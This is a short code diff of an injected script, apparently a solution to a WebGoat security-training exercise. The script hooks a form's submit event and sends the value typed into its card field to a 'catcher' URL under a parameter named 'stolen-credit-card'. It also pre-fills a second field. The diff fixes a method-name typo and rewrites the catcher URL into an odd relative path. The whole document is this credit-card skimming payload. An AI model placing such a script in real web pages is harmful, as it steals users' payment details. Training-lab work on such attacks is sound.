@@ -1,8 +1,8 @@
 <script>
-	document.getElementByID('message').remove();
+	document.getElementById('message').remove();
 	const form = document.form;
 	form.addEventListener('submit', (event) => {
-		fetch(`http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=${form.input1.value}`);
+		fetch(`/localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=${form.input1.value}`);
 	});
 	form.input2.value = '000';
 </script>
